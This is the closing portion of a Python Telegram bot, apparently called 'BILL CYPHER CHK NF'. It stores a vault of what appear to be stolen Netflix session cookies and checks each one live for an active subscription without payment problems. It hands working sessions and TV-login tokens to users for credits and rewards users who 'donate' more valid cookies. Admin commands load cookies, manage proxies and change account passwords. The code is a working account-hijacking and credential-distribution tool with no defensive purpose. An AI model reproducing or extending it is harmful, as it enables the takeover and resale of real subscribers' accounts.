            await query.message.reply_text(f"❌ Error al sincronizar: {e}")

    elif data == "panel:donate":
        await query.answer()
        _DONATE_USERS.add(uid)
        await query.message.reply_text(
            "🎁 <b>" + to_sans_bold_italic("DONAR COOKIES DE NETFLIX") + "</b> 🍿\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Envía la cookie en texto o adjunta un archivo <code>.txt</code> que deseas donar al baúl.\n\n"
            "💎 <b>Recompensa automática:</b>\n"
            "<i>Por cada cookie válida (Live con suscripción activa) que dones, recibirás <b>+1 activación extra</b> al instante.</i>\n\n"
            "Envía /cancel en cualquier momento si deseas cancelar.",
            parse_mode=ParseMode.HTML,
        )

    elif data == "panel:gencookie":
        await query.answer()

        if is_maintenance() and not is_admin(uid):
            await query.message.reply_text(MAINTENANCE_TEXT, parse_mode=ParseMode.HTML)
            return

        if not consume_credit(uid):
            await query.message.reply_text(
                OUT_OF_CREDITS_TEXT,
                parse_mode=ParseMode.HTML,
                reply_markup=out_of_credits_markup()
            )
            return

        vault = _load_vault()
        if not vault:
            refund_credit(uid)
            await query.message.reply_text(
                "📭 <b>¡Se agotaron las cookies!</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "Espera a que el propietario cargue nuevas cookies al baúl.\n"
                "━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.HTML
            )
            return

        status_msg = await query.message.reply_text("⚡ <i>Verificando cuenta en vivo y activando sesión de TV...</i>", parse_mode=ParseMode.HTML)
        loop = asyncio.get_running_loop()

        chosen_cookie = None
        live_result = None

        async with _ASYNC_VAULT_LOCK:
            vault = _load_vault()
            if not vault:
                refund_credit(uid)
                await status_msg.edit_text("📭 <b>¡Se agotaron las cookies en el baúl!</b>", parse_mode=ParseMode.HTML)
                return

            attempts = 0
            max_attempts = min(len(vault), 35)

            while attempts < max_attempts and vault:
                rand_idx = random.randrange(len(vault))
                candidate = vault.pop(rand_idx)
                attempts += 1

                candidate_str = candidate.get("cookie") if isinstance(candidate, dict) else str(candidate)
                tok = extract_core_netflix_id(candidate_str)
                if not tok:
                    continue

                chk_res = await loop.run_in_executor(
                    _EXECUTOR,
                    lambda: safe_check_cookie_clean(candidate_str, generate_token=True)
                )

                st = normalize_status(chk_res.get("status"), chk_res)
                ms = str(chk_res.get("membership_status") or "").upper()
                issues_str = " ".join(chk_res.get("account_issues") or []).lower()
                is_payment_issue = chk_res.get("is_on_hold") or ("payment" in issues_str or "pago" in issues_str or "suspend" in issues_str)
                nft_res = chk_res.get("nftoken") or {}

                if st == "hit" and not is_payment_issue and "FORMER" not in ms and "NEVER" not in ms and nft_res.get("success"):
                    real_tok = extract_bgiqv_token(nft_res, tok)
                    is_streaming_ok = await loop.run_in_executor(_EXECUTOR, lambda: verify_streaming_active(real_tok))
                    if is_streaming_ok:
                        chosen_cookie = candidate_str
                        live_result = chk_res
                        break

            if chosen_cookie and live_result:
                delivered_token = live_result.get("netflix_id") or extract_core_netflix_id(chosen_cookie)
                delivered_email = (live_result.get("email") or "").lower().strip()

                clean_vault = []
                for item in vault:
                    it_str = item.get("cookie") if isinstance(item, dict) else str(item)
                    it_tok = extract_core_netflix_id(it_str)
                    if delivered_token and it_tok == delivered_token:
                        continue
                    if delivered_email and delivered_email != "netflix account" and delivered_email in it_str.lower():
                        continue
                    clean_vault.append(it_str)

                _save_vault(clean_vault)
                asyncio.create_task(_cloud_auto_save(context.application))

        if not chosen_cookie or not live_result:
            refund_credit(uid)
            _save_vault(vault)
            await status_msg.edit_text(
                "⚠️ <b>No se encontraron cuentas activas sin problemas de pago en este momento.</b>\n"
                "<i>Tu crédito fue reembolsado automáticamente. Intenta de nuevo en unos momentos.</i>",
                parse_mode=ParseMode.HTML
            )
            return

        real_token = extract_bgiqv_token(live_result.get("nftoken", {}), live_result.get("netflix_id"))
        plan = live_result.get("plan_name") or "Premium"
        country = live_result.get("country") or "Desconocido"
        email = live_result.get("email") or "Netflix Account"
        clean_cookie = f"NetflixId={live_result.get('netflix_id') or extract_core_netflix_id(chosen_cookie)}"

        email_disp = html.escape(str(email))
        plan_disp = html.escape(str(plan))
        country_disp = html.escape(str(_country_display(country)))
        cookie_disp = html.escape(str(clean_cookie))

        txt = (
            "🎉 <b>" + to_sans_bold_italic("TU CUENTA DE NETFLIX ESTA LISTA!") + "</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"● 🎬 <b>" + to_sans_bold_italic("Plan:") + f"</b> {plan_disp}\n"
            f"● 🌍 <b>" + to_sans_bold_italic("Pais:") + f"</b> {country_disp}\n"
            f"● 📧 <b>" + to_sans_bold_italic("Email:") + f"</b> <code>{email_disp}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🍪 <b>" + to_sans_bold_italic("Cookie (Toca para copiar):") + f"</b>\n<code>{cookie_disp}</code>\n\n"
            "<i>Presiona un botón para ingresar o activar tu TV:</i>\n"
            "<i>💡 Si tu navegador ya tenía una sesión abierta, usa pestaña incógnito para ver este perfil directo.</i>\n\n"
            f"<i>{WATERMARK_TEXT}</i>"
        )
        kb = build_official_login_keyboard(real_token)
        try:
            await status_msg.edit_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            await query.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)

async def proxy_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    pass

async def cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer("Cancelando…")
    try:
        msg_id = int(query.data.split(":")[1])
        _CANCEL_SESSIONS.add(msg_id)
    except Exception:
        pass

async def mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    pass

async def setmode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    pass

async def setdelivery_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    pass

async def closesettings_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    try:
        await query.message.delete()
    except Exception:
        pass


# ===========================================================================
# 11. PUNTO DE ENTRADA (MAIN)
# ===========================================================================
def main() -> None:
    if not BOT_TOKEN:
        raise ValueError("TELEGRAM_BOT_TOKEN is not set.")

    try:
        start_dashboard(port=PORT)
        print(f"✅ Status dashboard running on port {PORT}")
    except Exception as e:
        logger.warning(f"Dashboard couldn't bind to port {PORT}: {e}")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(15)
        .pool_timeout(10)
        .build()
    )

    # Handlers de comandos
    app.add_handler(CommandHandler(["start", "cmds", "panel"], start_command))
    app.add_handler(CommandHandler("help",          help_command))
    app.add_handler(CommandHandler("info",          info_command))
    app.add_handler(CommandHandler("mode",          mode_command))
    app.add_handler(CommandHandler("fullinfo",      fullinfo_command))
    app.add_handler(CommandHandler("basic",         basic_command))
    app.add_handler(CommandHandler("settings",      settings_command))
    app.add_handler(CommandHandler("changepw",      changepw_command))
    app.add_handler(CommandHandler("cancel",        cancel_command))
    app.add_handler(CommandHandler("proxy",         proxy_command))
    app.add_handler(CommandHandler(["broadcast", "notif"], broadcast_command))
    app.add_handler(CommandHandler("users",         users_command))
    app.add_handler(CommandHandler("setbanner",     setbanner_command))
    app.add_handler(CommandHandler("addvault",      addvault_command))
    app.add_handler(CommandHandler("clearvault",    clearvault_command))
    app.add_handler(CommandHandler("setcredits",    setcredits_command))
    app.add_handler(CommandHandler("backup",        backup_command))
    app.add_handler(CommandHandler("restore",       restore_command))
    app.add_handler(CommandHandler(["mantenimiento", "maintenance"], maintenance_command))
    app.add_handler(CommandHandler(["donar", "donate"], donar_command))
    app.add_handler(CommandHandler("testerror",     testerror_command))

    # Callbacks interactivos
    app.add_handler(CallbackQueryHandler(panel_callback,         pattern=r"^panel:"))
    app.add_handler(CallbackQueryHandler(proxy_admin_callback,  pattern=r"^proxy:"))
    app.add_handler(CallbackQueryHandler(cancel_callback,       pattern=r"^cancel:"))
    app.add_handler(CallbackQueryHandler(mode_callback,         pattern=r"^mode:"))
    app.add_handler(CallbackQueryHandler(setmode_callback,      pattern=r"^setmode:"))
    app.add_handler(CallbackQueryHandler(setdelivery_callback,  pattern=r"^setdelivery:"))
    app.add_handler(CallbackQueryHandler(closesettings_callback, pattern=r"^closesettings$"))

    # Mensajes y documentos
    app.add_handler(MessageHandler(filters.Document.ALL,           handle_document))
    app.add_handler(MessageHandler(filters.VIDEO,                  setbanner_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    app.add_error_handler(error_handler)

    async def _post_init(application: Application) -> None:
        asyncio.create_task(_session_watchdog())
        global _BOT_USERNAME
        _BOT_USERNAME = (await application.bot.get_me()).username or ""

        try:
            local_vault = _load_vault()
            if len(local_vault) == 0:
                chat = await application.bot.get_chat(OWNER_ID)
                if chat.pinned_message and chat.pinned_message.document:
                    f = await chat.pinned_message.document.get_file()
                    b = await f.download_as_bytearray()
                    d = json.loads(b.decode("utf-8", errors="replace"))
                    cloud_vault = d.get("vault", [])
                    if cloud_vault:
                        _save_vault(cloud_vault)
                    if d.get("credits"):
                        _save_credits(d["credits"])
                    if d.get("users") and isinstance(d["users"], list):
                        _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
                    logger.info(f"Base de datos restaurada desde Telegram Cloud: {len(cloud_vault)} cuentas.")
            else:
                logger.info(f"Manteniendo stock local existente: {len(local_vault)} cuentas.")
        except Exception as e:
            logger.debug(f"Auto-restore on init: {e}")

        user_commands = [
            BotCommand("start",    "Panel principal"),
            BotCommand("donar",    "Donar cookies al baúl (+1 crédito)"),
            BotCommand("settings", "Configurar formato y entrega"),
            BotCommand("mode",     "Cambiar modo (Básico / Full)"),
            BotCommand("basic",    "Activar modo básico"),
            BotCommand("fullinfo", "Activar información completa"),
            BotCommand("info",     "Estadísticas en tiempo real"),
            BotCommand("help",     "Formatos de cookies soportados"),
            BotCommand("changepw", "Cambiar contraseña de cuenta"),
            BotCommand("cancel",   "Cancelar operación en curso"),
        ]
        await application.bot.set_my_commands(user_commands, scope=BotCommandScopeDefault())

        admin_commands = user_commands + [
            BotCommand("setcredits",    "Asignar créditos a usuario [Admin]"),
            BotCommand("addvault",      "Cargar cookies al baúl [Admin]"),
            BotCommand("clearvault",    "Vaciar cookies del baúl [Admin]"),
            BotCommand("mantenimiento", "Activar/Desactivar mantenimiento [Admin]"),
            BotCommand("backup",        "Descargar respaldo de baúl y créditos [Admin]"),
            BotCommand("restore",       "Restaurar respaldo desde archivo [Admin]"),
            BotCommand("proxy",         "Gestor de proxies [Admin]"),
            BotCommand("users",         "Descargar lista de usuarios [Admin]"),
            BotCommand("broadcast",     "Enviar notificación masiva [Admin]"),
            BotCommand("setbanner",     "Configurar video de cabecera [Admin]"),
        ]
        try:
            await application.bot.set_my_commands(
                admin_commands,
                scope=BotCommandScopeChat(chat_id=OWNER_ID)
            )
        except Exception as e:
            logger.debug("No se pudo configurar scope chat: %s", e)

    app.post_init = _post_init

    print("✅ El bot BILL CYPHER CHK NF está funcionando en Modo 5G Turbo…")
    app.run_polling(drop_pending_updates=True, allowed_updates=["message", "callback_query"])


if __name__ == "__main__":
    main()
